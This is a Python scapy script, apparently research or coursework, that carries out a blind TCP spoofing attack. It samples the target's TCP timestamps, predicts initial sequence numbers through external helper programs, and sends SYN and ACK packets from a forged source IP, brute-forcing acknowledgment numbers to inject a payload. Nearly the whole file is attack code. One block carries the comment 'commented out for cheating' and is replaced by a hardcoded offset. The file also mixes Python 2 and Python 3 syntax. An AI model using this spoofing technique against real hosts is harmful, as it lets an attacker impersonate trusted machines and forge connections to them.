#!/usr/local/bin/python

import sys
from scapy.all import *
from time import sleep
import subprocess
from ctypes import c_uint32

print("Hello!\n")
print(sys.version)
#initialize command line arguments (TODO: need to sanitize input and automate ip grab)
local_ip = sys.argv[1]
local_port = sys.argv[2]
remote_ip = sys.argv[3]
remote_port = sys.argv[4]
spoof_ip = sys.argv[5]
spoof_port = sys.argv[6]
seq_create = sys.argv[7]
spoof_diff_calc = sys.argv[8]

#determine sequence numbers ahead-of-time to reduce delay before spoof
#local_ip here is dest_ip for server
seq_num_output_current = subprocess.check_output([seq_create, remote_ip, remote_port, local_ip, local_port])

seq_num_output_spoof = subprocess.check_output([seq_create, remote_ip, remote_port, spoof_ip, spoof_port])

#move to own function - get the usual delay between packets
jiffie_reading = []

#send packets to get ts values
for num in range(0, 10):
    outbound_ip = IP(src=local_ip, dst=remote_ip)
    outbound_tcp = TCP(sport=int(local_port), dport=int(remote_port), flags="S", options=[('Timestamp', (0, 0))])
    packet = outbound_ip/outbound_tcp
    response = sr1(packet)
    jiffie_reading.append(int(response[TCP].options[3][1][0]))

#record the time between responses by taking diffs
jiffie_diffs = []  
for num in range(1,10):
    jiffie_diffs.append(jiffie_reading[num] - jiffie_reading[num-1])

#debug
for item in jiffie_diffs:
    print(item)
average = sum(jiffie_diffs)/len(jiffie_diffs)
average = int(average)
print("Average! - " + str(average))    


#create connection to server and record sequence number
outbound_ip = IP(src=local_ip, dst=remote_ip)
outbound_tcp = TCP(sport=int(local_port), dport=int(remote_port), flags="S", options=[('Timestamp', (0, 0))])
packet = outbound_ip/outbound_tcp
response = sr1(packet)

response_seq_num = int(response[TCP].seq)

#create spoofed connection
outbound_ip = IP(src=spoof_ip, dst=remote_ip)
outbound_tcp = TCP(sport=int(spoof_port), dport=int(remote_port), flags="S", options=[('Timestamp', (0, 0))])
packet = outbound_ip/outbound_tcp
send(packet)

#calculate new sequence number for spoofed connection based on difference with current one (moved to after initial packet sending to save time)
seq_num_output_current = int(seq_num_output_current)
seq_num_output_spoof = int(seq_num_output_spoof)
spoof_seq = subprocess.check_output([spoof_diff_calc, str(response_seq_num), str(seq_num_output_current), str(seq_num_output_spoof)])
spoof_seq = int(spoof_seq)
print response_seq_num
print "-"
print seq_num_output_current
print "+"
print seq_num_output_spoof
print "\n"
print(spoof_seq)


#sleep(.0001)


for num in range(-3, 3):
    nano_weight = 62500  #the amount we expect each read to differ for a change by 1 jiffie

#ORIGINAL, commented out for cheating
#    for num2 in range(0, (2 * 1000)): #calibrate this
#        ackie = spoof_seq + ((num + average) * nano_weight) + num2
#        print("Num jiffies off: " + str(num + average) + "Seq num: " + str(ackie))
#        outbound_tcp_ack = TCP(sport=int(spoof_port), dport=int(remote_port), flags="A", seq=1, ack=ackie)
#        packet = outbound_ip/outbound_tcp_ack/"Boosh!"
#        send(packet)

    for num2 in range(0, (100)): #calibrate this
        ackie = spoof_seq + 1187500 + num2
        print("Num jiffies off: " + str(num + average) + "Seq num: " + str(ackie))
        outbound_tcp_ack = TCP(sport=int(spoof_port), dport=int(remote_port), flags="A", seq=1, ack=ackie)
        packet = outbound_ip/outbound_tcp_ack/"Boosh!"
        send(packet)
    







#calculate time from sequence number

#spoof!

